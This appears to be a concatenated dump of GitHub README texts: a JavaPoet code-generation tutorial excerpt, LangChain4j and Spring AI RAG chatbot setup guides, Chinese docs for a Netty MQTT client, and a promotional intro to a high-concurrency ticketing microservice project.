JavaPoet supports `import static`. It does it via explicitly collecting type member names. Let's
enhance the previous example with some static sugar:

```java
...
ClassName namedBoards = ClassName.get(""com.mattel"", ""Hoverboard"", ""Boards"");

MethodSpec beyond = MethodSpec.methodBuilder(""beyond"")
    .returns(listOfHoverboards)
    .addStatement(""$T result = new $T<>()"", listOfHoverboards, arrayList)
    .addStatement(""result.add($T.createNimbus(2000))"", hoverboard)
    .addStatement(""result.add($T.createNimbus(\""2001\""))"", hoverboard)
    .addStatement(""result.add($T.createNimbus($T.THUNDERBOLT))"", hoverboard, namedBoards)
    .addStatement(""$T.sort(result)"", Collections.class)
    .addStatement(""return result.isEmpty() ? $T.emptyList() : result"", Collections.class)
    .build();

TypeSpec hello = TypeSpec.classBuilder(""HelloWorld"")
    .addMethod(beyond)
    .build();

JavaFile.builder(""com.example.helloworld"", hello)
    .addStaticImport(hoverboard, ""createNimbus"")
    .addStaticImport(namedBoards, ""*"")
    .addStaticImport(Collections.class, ""*"")
    .build();
```

JavaPoet will first add your `import static` block to the file as configured, match and mangle
all calls accordingly and also import all other types as needed.

```java
package com.example.helloworld;

import static com.mattel.Hoverboard.Boards.*;
import static com.mattel.Hoverboard.createNimbus;
import static java.util.Collections.*;

import com.mattel.Hoverboard;
import java.util.ArrayList;
import java.util.List;

class HelloWorld {
  List<Hoverboard> beyond() {
    List<Hoverboard> result = new ArrayList<>();
    result.add(createNimbus(2000));
    result.add(createNimbus(""2001""));
    result.add(createNimbus(THUNDERBOLT));
    sort(result);
    return result.isEmpty() ? emptyList() : result;
  }
}
```

## $N for Names

Generated code is often self-referential. Use **`$N`** to refer to another generated declaration by
its name. Here's a method that calls another:

```java
public String byteToHex(int b) {
  char[] result = new char[2];
  result[0] = hexDigit((b >>> 4) & 0xf);
  result[1] = hexDigit(b & 0xf);
  return new String(result);
}

public char hexDigit(int i) {
  return (char) (i < 10 ? i + '0' : i - 10 + 'a');
}
```

When generating the code above, we pass the `hexDigit()` method as an argument to the `byteToHex()`
method using `$N`:

```java
MethodSpec hexDigit = MethodSpec.methodBuilder(""hexDigit"")
    .addParameter(int.class, ""i"")
    .returns(char.class)
    .addStatement(""return (char) (i < 10 ? i + '0' : i - 10 + 'a')"")
    .build();

MethodSpec byteToHex = MethodSpec.methodBuilder(""byteToHex"")
    .addParameter(int.class, ""b"")
    .returns(String.class)
    .addStatement(""char[] result = new char[2]"")
    .addStatement(""result[0] = $N((b >>> 4) & 0xf)"", hexDigit)
    .addStatement(""result[1] = $N(b & 0xf)"", hexDigit)
    .addStatement(""return new String(result)"")
    .build();
```

## Code block format strings

Code blocks may specify the values for their placeholders in a few ways. Only one style may be used
for each operation on a code block.

### Relative Arguments

Pass an argument value for each placeholder in the format string to `CodeBlock.add()`. In each
example, we generate code to say ""I ate 3 tacos""

```java
CodeBlock.builder().add(""I ate $L $L"", 3, ""tacos"")
```

### Positional Arguments

Place an integer index (1-based) before the placeholder in the format string to specify which
 argument to use.

```java
CodeBlock.builder().add(""I ate $2L $1L"", ""tacos"", 3)
```

### Named Arguments

Use the syntax `$argumentName:X` where `X` is the format character and call `CodeBlock.addNamed()`
with a map containing all argument keys in the format string. Argument names use characters in
`a-z`, `A-Z`, `0-9`, and `_`, and must start with a lowercase character.

```java
Map<String, Object> map = new LinkedHashMap<>();
map.put(""food"", ""tacos"");
map.put(""count"", 3);
CodeBlock.builder().addNamed(""I ate $count:L $food:L"", map)
```

## Methods

All of the above methods have a code body. Use `Modifiers.ABSTRACT` to get a method without any
body. This is only legal if the enclosing class is either abstract or an interface.

```java
MethodSpec flux = MethodSpec.methodBuilder(""flux"")
    .addModifiers(Modifier.ABSTRACT, Modifier.PROTECTED)
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC, Modifier.ABSTRACT)
    .addMethod(flux)
    .build();
```

Which generates this:

```java
public abstract class HelloWorld {
  protected abstract void flux();
}
```

The other modifiers work where permitted. Note that when specifying modifiers, JavaPoet uses
`javax.lang.model.element.Modifier`, a class that is not available on Android. This
limitation applies to code-generating-code only; the output code runs everywhere: JVMs, Android,
and GWT.

Methods also have parameters, exceptions, varargs, Javadoc, annotations, type variables, and a
return type. All of these are configured with `MethodSpec.Builder`.

## Constructors

`MethodSpec` is a slight misnomer; it can also be used for constructors:

```java
MethodSpec flux = MethodSpec.constructorBuilder()
    .addModifiers(Modifier.PUBLIC)
    .addParameter(String.class, ""greeting"")
    .addStatement(""this.$N = $N"", ""greeting"", ""greeting"")
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC)
    .addField(String.class, ""greeting"", Modifier.PRIVATE, Modifier.FINAL)
    .addMethod(flux)
    .build();
```

Which generates this:

```java
public class HelloWorld {
  private final String greeting;

  public HelloWorld(String greeting) {
    this.greeting = greeting;
  }
}
```

For the most part, constructors work just like methods. When emitting code, JavaPoet will place
constructors before methods in the output file.

## Parameters

Declare parameters on methods and constructors with either `ParameterSpec.builder()` or
`MethodSpec`'s convenient `addParameter()` API:

```java
ParameterSpec android = ParameterSpec.builder(String.class, ""android"")
    .addModifiers(Modifier.FINAL)
    .build();

MethodSpec welcomeOverlords = MethodSpec.methodBuilder(""welcomeOverlords"")
    .addParameter(android)
    .addParameter(String.class, ""robot"", Modifier.FINAL)
    .build();
```

Though the code above to generate `android` and `robot` parameters is different, the output is the
same:

```java
void welcomeOverlords(final String android, final String robot) {
}
```

The extended `Builder` form is necessary when the parameter has annotations (such as `@Nullable`).

## Fields

Like parameters, fields can be created either with builders or by using convenient helper methods:

```java
FieldSpec android = FieldSpec.builder(String.class, ""android"")
    .addModifiers(Modifier.PRIVATE, Modifier.FINAL)
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC)
    .addField(android)
    .addField(String.class, ""robot"", Modifier.PRIVATE, Modifier.FINAL)
    .build();
```

Which generates:

```java
public class HelloWorld {
  private final String android;

  private final String robot;
}
```

The extended `Builder` form is necessary when a field has Javadoc, annotations, or a field
initializer. Field initializers use the same `String.format()`-like syntax as the code
blocks above:

```java
FieldSpec android = FieldSpec.builder(String.class, ""android"")
    .addModifiers(Modifier.PRIVATE, Modifier.FINAL)
    .initializer(""$S + $L"", ""Lollipop v."", 5.0d)
    .build();
```

Which generates:

```java
private final String android = ""Lollipop v."" + 5.0;
```

## Interfaces

JavaPoet has no trouble with interfaces. Note that interface methods must always be `PUBLIC
ABSTRACT` and interface fields must always be `PUBLIC STATIC FINAL`. These modifiers are necessary
when defining the interface:

```java
TypeSpec helloWorld = TypeSpec.interfaceBuilder(""HelloWorld"")
    .addModifiers(Modifier.PUBLIC)
    .addField(FieldSpec.builder(String.class, ""ONLY_THING_THAT_IS_CONSTANT"")
        .addModifiers(Modifier.PUBLIC, Modifier.STATIC, Modifier.FINAL)
        .initializer(""$S"", ""change"")
        .build())
    .addMethod(MethodSpec.methodBuilder(""beep"")
        .addModifiers(Modifier.PUBLIC, Modifier.ABSTRACT)
        .build())
    .build();
```

But these modifiers are omitted when the code is generated. These are the defaults so we don't need
to include them for `javac`'s benefit!

```java
public interface HelloWorld {
  String ONLY_THING_THAT_IS_CONSTANT = ""change"";

  void beep();
}
```

## Enums

Use `enumBuilder` to create the enum type, and `addEnumConstant()` for each value:

```java
TypeSpec helloWorld = TypeSpec.enumBuilder(""Roshambo"")
    .addModifiers(Modifier.PUBLIC)
    .addEnumConstant(""ROCK"")
    .addEnumConstant(""SCISSORS"")
    .addEnumConstant(""PAPER"")
    .build();
```

To generate this:

```java
public enum Roshambo {
  ROCK,

  SCISSORS,

  PAPER
}
```

Fancy enums are supported, where the enum values override methods or call a superclass constructor.
Here's a comprehensive example:

```java
TypeSpec helloWorld = TypeSpec.enumBuilder(""Roshambo"")
    .addModifiers(Modifier.PUBLIC)
    .addEnumConstant(""ROCK"", TypeSpec.anonymousClassBuilder(""$S"", ""fist"")
        .addMethod(MethodSpec.methodBuilder(""toString"")
            .addAnnotation(Override.class)
            .addModifiers(Modifier.PUBLIC)
            .addStatement(""return $S"", ""avalanche!"")
            .returns(String.class)
            .build())
        .build())
    .addEnumConstant(""SCISSORS"", TypeSpec.anonymousClassBuilder(""$S"", ""peace"")
        .build())
    .addEnumConstant(""PAPER"", TypeSpec.anonymousClassBuilder(""$S"", ""flat"")
        .build())
    .addField(String.class, ""handsign"", Modifier.PRIVATE, Modifier.FINAL)
    .addMethod(MethodSpec.constructorBuilder()
        .addParameter(String.class, ""handsign"")
        .addStatement(""this.$N = $N"", ""handsign"", ""handsign"")
        .build())
    .build();
```

Which generates this:

```java
public enum Roshambo {
  ROCK(""fist"") {
    @Override
    public String toString() {
      return ""avalanche!"";
    }
  },

  SCISSORS(""peace""),

  PAPER(""flat"");

  private final String handsign;

  Roshambo(String handsign) {
    this.handsign = handsign;
  }
}
```

## Anonymous Inner Classes

In the enum code, we used `TypeSpec.anonymousInnerClass()`. Anonymous inner classes can also be used in
code blocks. They are values that can be referenced with `$L`:

```java
TypeSpec comparator = TypeSpec.anonymousClassBuilder("""")
    .addSuperinterface(ParameterizedTypeName.get(Comparator.class, String.class))
    .addMethod(MethodSpec.methodBuilder(""compare"")
        .addAnnotation(Override.class)
        .addModifiers(Modifier.PUBLIC)
        .addParameter(String.class, ""a"")
        .addParameter(String.class, ""b"")
        .returns(int.class)
        .addStatement(""return $N.length() - $N.length()"", ""a"", ""b"")
        .build())
    .build();

TypeSpec helloWorld = TypeSpec.classBuilder(""HelloWorld"")
    .addMethod(MethodSpec.methodBuilder(""sortByLength"")
        .addParameter(ParameterizedTypeName.get(List.class, String.class), ""strings"")
        .addStatement(""$T.sort($N, $L)"", Collections.class, ""strings"", comparator)
        .build())
    .build();
```

This generates a method that contains a class that contains a method:

```java
void sortByLength(List<String> strings) {
  Collections.sort(strings, new Comparator<String>() {
    @Override
    public int compare(String a, String b) {
      return a.length() - b.length();
    }
  });
}
```

One particularly tricky part of defining anonymous inner classes is the arguments to the superclass
constructor. In the above code we're passing the empty string for no arguments:
`TypeSpec.anonymousClassBuilder("""")`. To pass different parameters use JavaPoet's code block
syntax with commas to separate arguments.


## Annotations

Simple annotations are easy:

```java
MethodSpec toString = MethodSpec.methodBuilder(""toString"")
    .addAnnotation(Override.class)
    .returns(String.class)
    .addModifiers(Modifier.PUBLIC)
    .addStatement(""return $S"", ""Hoverboard"")
    .build();
```

Which generates this method with an `@Override` annotation:

```java
  @Override
  public String toString() {
    return ""Hoverboard"";
  }
```

Use `AnnotationSpec.builder()` to set properties on annotations:

```java
MethodSpec logRecord = MethodSpec.methodBuilder(""recordEvent"")
    .addModifiers(Modifier.PUBLIC, Modifier.ABSTRACT)
    .addAnnotation(AnnotationSpec.builder(Headers.class)
        .addMember(""accept"", ""$S"", ""application/json; charset=utf-8"")
        .addMember(""userAgent"", ""$S"", ""Square Cash"")
        .build())
    .addParameter(LogRecord.class, ""logRecord"")
    .returns(LogReceipt.class)
    .build();
```

Which generates this annotation with `accept` and `userAgent` properties:

```java
@Headers(
    accept = ""application/json; charset=utf-8"",
    userAgent = ""Square Cash""
)
LogReceipt recordEvent(LogRecord logRecord);
```

When you get fancy, annotation values can be annotations themselves. Use `$L` for embedded
annotations:

```java
MethodSpec logRecord = MethodSpec.methodBuilder(""recordEvent"")
    .addModifiers(Modifier.PUBLIC, Modifier.ABSTRACT)
    .addAnnotation(AnnotationSpec.builder(HeaderList.class)
        .addMember(""value"", ""$L"", AnnotationSpec.builder(Header.class)
            .addMember(""name"", ""$S"", ""Accept"")
            .addMember(""value"", ""$S"", ""application/json; charset=utf-8"")
            .build())
        .addMember(""value"", ""$L"", AnnotationSpec.builder(Header.class)
            .addMember(""name"", ""$S"", ""User-Agent"")
            .addMember(""value"", ""$S"", ""Square Cash"")
            .build())
        .build())
    .addParameter(LogRecord.class, ""logRecord"")
    .returns(LogReceipt.class)
    .build();
```

Which generates this:

```java
@HeaderList({
    @Header(name = ""Accept"", value = ""application/json; charset=utf-8""),
    @Header(name = ""User-Agent"", value = ""Square Cash"")
})
LogReceipt recordEvent(LogRecord logRecord);
```

Note that you can call `addMember()` multiple times with the same property name to populate a list
of values for that property.

## Javadoc

Fields, methods and types can be documented with Javadoc:

```java
MethodSpec dismiss = MethodSpec.methodBuilder(""dismiss"")
    .addJavadoc(""Hides {@code message} from the caller's history. Other\n""
        + ""participants in the conversation will continue to see the\n""
        + ""message in their own history unless they also delete it.\n"")
    .addJavadoc(""\n"")
    .addJavadoc(""<p>Use {@link #delete($T)} to delete the entire\n""
        + ""conversation for all participants.\n"", Conversation.class)
    .addModifiers(Modifier.PUBLIC, Modifier.ABSTRACT)
    .addParameter(Message.class, ""message"")
    .build();
```

Which generates this:

```java
  /**
   * Hides {@code message} from the caller's history. Other
   * participants in the conversation will continue to see the
   * message in their own history unless they also delete it.
   *
   * <p>Use {@link #delete(Conversation)} to delete the entire
   * conversation for all participants.
   */
  void dismiss(Message message);
```

Use `$T` when referencing types in Javadoc to get automatic imports.

MYethishwar/JavaLabCraft,main,"# Java Programming Language
Java is a high-level, class-based, object-oriented programming language that is designed to have as few implementation dependencies as possible. It is a general-purpose programming language intended to let application developers write once, run anywhere (WORA), meaning that compiled Java code can run on all platforms that support Java without the need for recompilation. Java applications are typically compiled to bytecode that can run on any Java virtual machine (JVM) regardless of the underlying computer architecture. The syntax of Java is similar to C and C++, but it has fewer low-level facilities than either of them. The language was first released by Sun Microsystems in 1995 and later acquired by Oracle Corporation.

marcushellberg/java-chat-with-documents,main,"# Java AI chatbot that uses your documents as context 

This app demonstrates how you can create a custom AI chatbot that can use your own documents to answer questions using RAG (retrieval augmented generation).
The chatbot uses [LangChain4j](https://github.com/langchain4j/langchain4j) and the OpenAI API to generate responses and [Vaadin](http://vaadin.com/) to create the user interface.

> [!IMPORTANT]
> Before you can use the application you need to:
> 1. Configure the documentation location
> 2. Configure either OpenAi or a local LLM

## 🛠️ Configuration

### Configuring documentation location

Update the `docs.location` property in `application.properties` to point to a folder with relevant documents. 
LangChain4j uses Apache Tika internally when processing the files, so most file types work.

### Using Open AI

OpenAI gives you better quality answers but requires you to send data to a 3rd party.

To use OpenAI, get an [API key](https://platform.openai.com/api-keys) and configure it in `application.properties`. 
Optionally, you can also configure the model in the properties. 

### Using a local LLM

Using a local model allows you to keep your data on your local computer, but the quality of answers will not be as good as with OpenAI.

Install [Ollama](https://ollama.com/) and the `llama3` model.
Comment out the OpenAI section of `application.properties` and uncomment the Ollama section.

### Optional: Embedding store (Vector DB)

By default, the application uses an in-memory embedding store. This is fine for demos and small amounts of data. 
If you need to store more documents, consider using any of the [embedding stores that LangChain4j supports](https://docs.langchain4j.dev/integrations/embedding-stores/).

## ▶️ Running the application

The project is a standard Maven project. To run it from the command line,
type `mvnw` (Windows), or `./mvnw` (Mac & Linux), then open
http://localhost:8080 in your browser.

You can also import the project to your IDE of choice as you would with any
Maven project. Read more on [how to import Vaadin projects to different IDEs](https://vaadin.com/docs/latest/guide/step-by-step/importing) (Eclipse, IntelliJ IDEA, NetBeans, and VS Code).

```

### 2.9 拦截器

#### 步骤

支持拦截的接口：MqttClient、MqttConnector、MqttDelegateHandler

使用方式：

​	1.实现拦截器接口Interceptor

​	2.类上添加注解@Intercepts，并在type值中添加支持拦截的接口，直接单个和多个

​	3.在intercept方法中进行拦截

​	4.调用Invocation的proceed()执行目标方法

​	5.添加拦截器值MQTT客户端工厂或全局配置器中

#### 示例

```
@Intercepts(type = {MqttClient.class, MqttConnector.class})
public class LogInterceptor implements Interceptor {
    @Override
    public Object intercept(Invocation invocation) throws Throwable {
        Object target = invocation.getTarget();
        Object[] args = invocation.getArgs();
        Method method = invocation.getMethod();
        //执行目标方法
        Object returnObj = invocation.proceed();
        LogUtils.info(LogInterceptor.class, ""拦截目标："" + target.getClass().getSimpleName() + ""，拦截方法："" + method.getName() + ""，拦截参数："" + Arrays.toString(args) + ""，拦截返回值："" + returnObj);
        return returnObj;
    }
}
```

```
//通过MQTT客户端工厂添加拦截器
mqttClientFactory.addInterceptor(new LogInterceptor());
```

或者

```
//通过全局配置器添加拦截器
mqttConfiguration.addInterceptor(new LogInterceptor());
```

### 2.10 消息存储器

目前支持三种消息存储方式

#### 内存消息存储器（默认）

```
mqttClientFactory.setMqttMsgStore(new MemoryMqttMsgStore());
```

使用该方式，未完成的QOS1、QOS2的消息在JVM重启后会消失

#### Redis消息存储器

导入Redis的maven依赖

```
<dependency>
    <groupId>redis.clients</groupId>
    <artifactId>jedis</artifactId>
    <version>5.1.0</version>
</dependency>
```

使用Redis持久化消息存储器

```
JedisPool jedisPool = new JedisPool();
RedisMqttMsgStore redisMqttMsgStore = new RedisMqttMsgStore(jedisPool);
mqttClientFactory.setMqttMsgStore(redisMqttMsgStore);
```

使用该方式，未完成的QOS1、QOS2的消息会存储（仅限classSession为false生效）

#### 文件消息存储器

```
File mqttMsgFile = new File(""E:/test.properties"");
if(!mqttMsgFile.exists()) {
    mqttMsgFile.createNewFile();
}
FileMqttMsgStore fileMqttMsgStore = new FileMqttMsgStore(mqttMsgFile);
mqttClientFactory.setMqttMsgStore(fileMqttMsgStore);
```

使用该方式，必须传递一个properties的文件；该方式下未完成的QOS1、QOS2的消息会存储（仅限classSession为false生效）

### 2.11 代理工厂

#### 使用

目前已有两种代理工厂的实现，包括：JDK的动态代理（默认）、Cglib的动态代理

如果需要切换为cglib的动态代理，需要先导入cglib的maven依赖

```
<dependency>
    <groupId>cglib</groupId>
    <artifactId>cglib</artifactId>
    <version>3.3.0</version>
</dependency>
```

```
mqttClientFactory.setProxyFactory(new CglibProxyFactory());
```

#### 扩展

如果需要自行实现代理工厂，只需实现 ProxyFactory 接口即可

### 2.12 消息别名

当短时间内需要给同一个主题发送大量消息时，可以使用消息别名的方式（MQTT 5）

```
MqttMsgInfo mqttMsgInfo = new MqttMsgInfo(""test"",new byte[]{1,2,3},MqttQoS.EXACTLY_ONCE);
//消息别名
mqttMsgInfo.setTopicAlias(101);
MqttMsgInfo mqttMsgInfo1 = new MqttMsgInfo(""test"",new byte[]{1,2,3},MqttQoS.EXACTLY_ONCE);
//消息别名
mqttMsgInfo.setTopicAlias(101);
mqttClient.publish(mqttMsgInfo);
mqttClient.publish(mqttMsgInfo1);
//...更多同一主题的消息
```

只需要为同一消息主题设置相同的别名，再发送消息时，会无感的将主题名替换为 null ，从而节省主题流量。

### 2.13 认证增强（MQTT 5）

在连接参数设置时，添加连接时的认证内容，MQTT客户端会在收到 auth 包时，调用认证器的方法

```
MqttConnectParameter mqttConnectParameter = new MqttConnectParameter(""test"");
//添加认证方法和认证数据
mqttConnectParameter.setAuthenticationMethod(""test"");
mqttConnectParameter.setAuthenticationData(new byte[] {1,1,1});
//添加认证器
MqttAuthenticator mqttAuthenticator = (s, bytes) -> {
    //对bytes 数组处理....
    //返回认证指示
    MqttAuthInstruct mqttAuthInstruct = new MqttAuthInstruct(MqttAuthInstruct.Instruct.AUTH_CONTINUE);
    mqttAuthInstruct.setAuthenticationData(new byte[]{1,2,3});
    return mqttAuthInstruct;
};
mqttConnectParameter.setMqttAuthenticator(mqttAuthenticator);
```

开发者可根据接收到的认证数据进行下一步操作的判断，并且指示下一步的认证操作，当MQTT Broker认证完成后，将会执行连接完成回调

注意：在SSL相关的参数中，rootCertificateFile不是必须的，前提是 Broker 的证书是权威CA认证的话就不需要，如果是自签名的证书就需要该文件；并且在双向认证中，如果你使用的是jks或pkcs后缀的文件（私钥和证书的结合体），那么请将其转换为证书和私钥两个文件。

### 2.15 测试用例

所有的测试用例均在目录：

> src/test/java/io/github/netty/mqtt/client

当需要执行测试用例时，需要修改pom.xml文件中的，编译插件项，如下：

```
            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <version>3.8.1</version>
                <configuration>
                    <source>8</source>
                    <target>8</target>
                    <!-- 此处修改为false -->
                    <skip>false</skip>
                </configuration>
            </plugin>
```



## 3. 其它

### 3.1 注意事项

1.需要JDK版本1.8及以上

2.日志需要导入日志框架，如果没有日志框架，则会在控制台打印日志

3.以上所有的API，MQTT 3.1.1 和 MQTT 5版本之间是互相兼容的

### 3.2 issue

如果产生问题，请提issue

> 这不是一个AI大模型，但是可以帮你快速集成AI大模型到Spring项目中，  
> 并通过“检索增强生成(RAG)”的方式建立专家知识库帮助大模型回答问题。  
> 
> 核心功能依赖于[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)实现，RAG运行原理如下  
> ![img_3.png](img_3.png)

## 代码示例
1. 使用[易智Spring](https://gitee.com/wb04307201/easy-ai-spring-boot-starter)实现的[AI大模型Demo](https://gitee.com/wb04307201/easy-ai-demo)

## 快速开始
### 引入依赖
增加 JitPack 仓库
```xml
<repositories>
    <repository>
        <id>jitpack.io</id>
        <url>https://jitpack.io</url>
    </repository>
</repositories>
```
引入jar
```xml
<dependency>
    <groupId>com.github.wb04307201</groupId>
    <artifactId>easy-ai-spring-boot-starter</artifactId>
    <version>0.6.1</version>
</dependency>
```

### 安装向量数据库
通过docker安装chromadb数据库
```shell
docker run -d --name chromadb -p 8000:8000 chromadb/chroma
```

### 安装大语言模型
默认通过[ollama](https://ollama.com/)使用大模型，下载并安装
```shell
# 拉取llama3模型
ollama pull llama3
# 拉取qwen2模型
ollama pull qwen2
```

### 添加相关配置
```yaml
spring:
  application:
    name: spring_ai_demo
  ai:
    ollama:
      chat:
        options:
          #  model: llama3
          model: qwen2
      embedding:
        options:
          model: qwen2
      base-url: ""http://localhost:11434""
    vectorstore:
      chroma:
        client:
          host: http://localhost
          port: 8000
        collection-name: SpringAiCollection
        initialize-schema: true
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

### 在启动类上加上`@EnableEasyAi`注解
```java
@EnableEasyAi
@SpringBootApplication
public class EasyAiDemoApplication {

    public static void main(String[] args) {
        SpringApplication.run(EasyAiDemoApplication.class, args);
    }

}
```

### 使用检索增强生成(RAG)辅助对话
当未上传知识库时  
![img_4.png](img_4.png)  
显然开始胡说八道了

现在让我们上传一些知识库，访问文档上传界面http://ip:端口/easy/ai/list  
![img.png](img.png)  
状态列显示“向量存储完”即文档已转入知识库  

访问聊天界面http://ip:端口/easy/ai/chat  
![img_5.png](img_5.png)

## 高级
### 使用其他大模型API
这里以[智谱AI](https://open.bigmodel.cn/)为例，如何对接大模型API  
修改项目依赖，支持的大模型平台可到[Spring AI](https://docs.spring.io/spring-ai/reference/index.html)查看  
```xml
        <dependency>
            <groupId>com.gitee.wb04307201</groupId>
            <artifactId>easy-ai-spring-boot-starter</artifactId>
            <version>0.6.1</version>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.ai</groupId>
                    <artifactId>spring-ai-ollama-spring-boot-starter</artifactId>
                </exclusion>
            </exclusions>
        </dependency>
        <dependency>
            <groupId>org.springframework.ai</groupId>
            <artifactId>spring-ai-zhipuai-spring-boot-starter</artifactId>
            <version>1.0.0-SNAPSHOT</version>
        </dependency>
```
修改配置项目
```yaml
spring:
  ai:
    zhipuai:
      api-key: 智谱AI API Key
```

## 项目背景
可以说目前的Java程序员面试是非常激烈的，前几年大家都热衷于八股文的研究，把八股文背熟了大部分就能拿到岗位offer了，但现在仅仅靠八股文已经不好使了，现在面试官看的是真正的设计项目，**项目中的架构复杂程度怎样？**、**做过的东西哪些具有亮点？**、
**解决了哪些有价值的问题？** 将实际项目和八股文相结合从而判断面试者的能力。

而且现在内卷逐渐激烈，从一开始只会简单增删改查，到后来的各种微服务和中间件，再到现在要有类似 “商品秒杀、抵抗百万并发的压力..""等技术的亮点才行

所以大家急迫的需要一个具有新的业务，而且要有亮点的项目，要是有人能指导下如何写到简历上就更好了，你可以站在面试官的角度上考虑一下，如果你在挑选简历时，看到了之前没有见过，但亮点却很多的项目，你是不是一下子就被吸引住了呢？

## 项目介绍

- **在线体验：** [https://www.damai-javaup.chat](https://www.damai-javaup.chat)

- **详细讲解：** [https://www.javaup.chat/pages/83cf22](https://www.javaup.chat/pages/83cf22/)

大麦订票服务系统提供了可以在线上对相应的节目（包括：演唱会、话剧歌剧、体育比赛、儿童亲子）进行订票的功能，用户可以进行注册，登录，然后选择节目和座位后进行购票，支付，以及查询自己的订单功能

## 项目优势

大家对于订票时尤其是热门明星的演唱会，第一感觉就是票不好抢，一瞬间票就没有了，而本项目不仅仅是将上述的购票功能实现，并且还要解决这种票不好抢，也就是常说的 **高并发** 问题

小伙伴通过此项目能够掌握分布式微服务项目的设计、以及 **真实生产环境的高并发解决方案**。而且项目中遵循了 **高内聚 低耦合** 设计原则以及使用大量的设计模式来进行架构设计，相信小伙伴学习完此项目后技术会提升几个层次

项目中包括了 **微服务**、**本地缓存/分布式缓存**、**消息队列**、**搜索引擎**、**并发编程**、**本地锁/分布式锁**、**设计模式**、**分库分表** 等核心技术

### 本项目主打的是真实性和独特性，都是根据真实架构和实际遇到的问题总结的

- 本项目对于高并发、高吞吐量的解决方案都是经过真实生产环境验证的，而不是简单的demo而已。而且除了这些以外，还包括了实际开发中项目中的各种架构设计，因为在项目对接的时候，绝不是只是把数据提供给前端就完事了

- 针对实际生产遇到的问题进行**深度定制化的改造**，**是生产中真正用的东西**。这些都是针对业务特点单独设计的，网上也没有现成完整的资料，也不是市面上的理论八股文宝典或者简单的后台管理项目

- 对要毕业的大学生、刚参加工作不久的同学、或者工作多年想对技术有提升的小伙伴都有适合的干货

- 又比如说 **SpringBoot的自动装配原理**，很多人都背过这个，但究竟用自动装配有什么好处呢？为什么不直接写个组件然后其他项目来依赖呢？两者的区别在哪里呢？在项目中依旧会有讲解

## 技术结构

- 使用了 **SpringCloud+SpringCloudAlibaba** 的微服务结构

- 使用了 **Nacos** 作为注册中心

- 使用 **Redis** 不仅仅作为缓存，还使用了`Lua脚本`/`延迟队列`/`Stream消息队列` 等高级特性

- 引入了 **Kafka** 消息中间件，**SpringBootAdmin** 作为服务的监控通知

- **ELK** 作为日志的记录，**ElasticSearch**提供搜索和展示功能，

- **Sentinel/Hystrix** 作为熔断保护层

- 使用 **ShardingSphere** 实现分库分表，来存储海量的数据

通过以上设计，来实现应对高并发、高吞吐的能力，以及海量数据的存储和服务状态的监控

## 架构和组件设计

针对于分布式和微服务的项目来说，随着业务的发展，项目的数量上千个都是很正常的，但如何要把这些项目做好配置，做好架构设计，设计出组件库，都是要考虑的因素

既然组件库是要给其他服务提供使用，所以在设计时要考虑的细节非常的多，**设计模式和高内聚低耦合的思想更加的重要**，而且代码的健壮性和高效率的执行也是同样重要，而在大麦项目中，使用了SpringBoot的自动装配机制来设计组件库

除了组件库外，还有对**异常的处理、数据的封装格式、多线程的使用等等也都要进行相应的封装设计**，这些在项目中同样具备

![](https://multimedia-javaup.cn/%E6%9E%B6%E6%9E%84%E5%9B%BE%2F%E7%BB%84%E4%BB%B6%E6%9E%B6%E6%9E%84%E5%9B%BE.png)

## 业务流程

对于大麦项目来说，核心的业务就是用户选择节目然后进行购票功能了，项目中不仅完整了对整个业务流程的完整闭环，而且考虑到既然设计此项目是为了应对高并发的特点，那么在从业务的角度上也做了很多的优化设计

![](https://multimedia-javaup.cn/%E6%9E%B6%E6%9E%84%E5%9B%BE/%E4%B8%9A%E5%8A%A1%E5%9B%BE%E4%BC%98%E5%8C%96.png)	

## 项目的亮点质量高吗

我也是一路过来的，所以很清楚大家的心态，希望是能和实际业务结合起来进行学习项目的架构设计技巧以及解决高并发的解决方案，

#### 这里有一点要注意 就是不要让大家过于的陷入项目中的复杂业务中

一方面其实面试官并不会对你做过的业务太感兴趣，太复杂了也听不懂，**最好是你能把业务和解决问题的能力结合起来给他讲**，

另一方面项目的目的是让你提供技术能力，业务固然重要，但还是希望以后能把学到的技术应用到自己的项目中做到融会贯通。

而本项目争取让小伙伴尽可能快速理解业务的前提下，充分的来提供技术能力，尽量减少不必要的时间和精力

### 项目中的各个亮点部分

项目的亮点可以分成多个部分，比如涉及到用户服务的业务时，项目在海量并发的场景下的问题：

- **用户服务如何设计分库分表，存在用户邮箱、用户手机号多种方式登录，要怎么设计不会发生读扩散问题？**

- **当一瞬间有大量的用户注册请求时，如何防止 缓存穿透问题？网上说的那些方案到底靠谱吗？到底要怎么解决并且不影响用户体验？**

- **用户和购票人数据为了应对高并发的场景下，在缓存中要怎么设计？把所有数据都放进去吗？**

- **如何设计缓存策略？采取哪种结构来存储？采取哪种维度来存储？哪些数据适合放入缓存？哪些不适合？**

  

在用户进行浏览的过程中，对于问题的存在同样也不少：

- **如何应对高并发下的用户查询请求？在主页列表、类型列表、的请求查看下，如何将设计分库分表的数据查询方案？**

- **节目详情要怎么设计缓存？有了Redis就可以了吗？突发性流量激增的问题怎么解决？**

- **如何设计多级缓存来应对几十万，甚至几百万的访问压力？如果发生了缓存雪崩要如何解决和提前预防？**

  

而在用户购票的流程中，为了解决高并发的压力，需要考虑的问题和细节就会更多：

- **如何应对高并发下的用户购票压力？在购票流程中怎么考虑缓存和数据库的交互？**

- **库存数量在缓存中应该如何设计？用户购票和支付过程中，要怎么正确的扣除库存？异常了怎么回滚？数据库中的余票数量一致性要如何解决？**

- **分布式锁使用起来的细节到底有哪些？只要加上一行锁就可以了吗？**

- **高并发下的分布式锁如何进一步的优化？锁的粒度？网络请求的性能？**

- **幂等功能如何实现？有哪些维度需要考虑？**

- **经典的缓存数据库一致性的问题实际生产环境中到底如何解决？直接删除缓存、延迟双删 这些方案到底可行吗？**



而在整个项目的架构设计上，也有很多的问题存在：

- **高并发下订单延迟关闭功能如何实现？使用中间件作为延迟队列的问题？使用redis作为延迟队列可以吗？如何提高性能？**

